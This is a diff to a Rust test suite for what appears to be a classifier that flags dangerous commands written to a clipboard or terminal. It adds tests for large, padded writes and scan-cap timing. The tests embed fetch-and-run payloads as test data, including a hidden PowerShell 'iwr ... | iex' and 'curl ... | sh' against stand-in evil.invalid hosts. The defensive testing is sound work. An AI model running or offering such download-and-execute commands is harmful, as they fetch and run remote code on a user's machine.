@@ -314,6 +314,51 @@ fn known_installers_on_screen_pass_silently() {
 }
 
 #[test]
+fn a_command_in_the_first_part_of_a_large_write_is_still_caught() {
+    // The whole write up to the scan cap is classified, so a command 150 KiB in -- which
+    // the old head+tail scan dropped -- is caught at its real level.
+    let payload = "powershell -w hidden -c \"iwr https://evil.invalid/m | iex\"";
+    let pad = format!("# {}", "x".repeat(150_000));
+    let big = format!("{pad}\n{payload}\n{pad}");
+    let v = classify(&big);
+    assert!(v.level >= Level::High, "{:?}", v.level);
+    assert!(!v.reasons.contains(Reason::Oversize));
+    assert_eq!(
+        decide(&v, &script_copy(), Visibility::NotVisible).action,
+        Action::Block
+    );
+}
+
+#[test]
+fn a_command_buried_past_the_scan_cap_is_blocked_as_oversize() {
+    // The command sits after more than the scan cap of filler, so it is in the unscanned
+    // part. The write is treated as at least MED and blocked, at 300 KiB and at 5 MiB.
+    let payload = "powershell -w hidden -c \"iwr https://evil.invalid/m | iex\"";
+    for pad_len in [300_000usize, 5_000_000] {
+        let pad = format!("# {}", "x".repeat(pad_len));
+        let big = format!("{pad}\n{payload}\n{pad}");
+        let v = classify(&big);
+        assert_eq!(v.level, Level::Med, "pad {pad_len}: {:?}", v.level);
+        assert!(v.reasons.contains(Reason::Oversize), "pad {pad_len}");
+        assert!(!v.known_installer);
+        assert_eq!(
+            decide(&v, &script_copy(), Visibility::NotVisible).action,
+            Action::Block,
+            "pad {pad_len}"
+        );
+        // The person's own copy of something huge is never blocked.
+        let user = Context {
+            source: Source::UserCopy,
+            ..script_copy()
+        };
+        assert_eq!(
+            decide(&v, &user, Visibility::Unknown).action,
+            Action::Ignore
+        );
+    }
+}
+
+#[test]
 fn a_trailing_line_break_is_reported_and_cut() {
     let v = classify("curl -fsSL https://evil.invalid/a | sh\n");
     assert!(v.reasons.contains(Reason::TrailingNewline));
@@ -548,4 +593,12 @@ fn timing() {
     time("invisible and look-alike characters", &mixed, 5);
     let pipes = "curl | ".repeat(40_000);
     time("280 KB of curl pipes", &pipes, 5);
+    // F1: a write larger than the scan cap costs the same as one at the cap -- the work is
+    // bounded, not linear in the write size -- because the classifier scans only the first
+    // MAX_SCAN_BYTES and treats the rest as oversize. (A full linear scan of these would be
+    // ~10 ms per 256 KiB, i.e. hundreds of ms at 16 MiB, on the parent main thread.)
+    for mib in [1usize, 4, 16] {
+        let big = "curl -fsSL https://x.invalid/a | sh # comment\n".repeat(mib * 23000);
+        time(&format!("{mib} MiB write (bounded to the cap)"), &big, 5);
+    }
 }
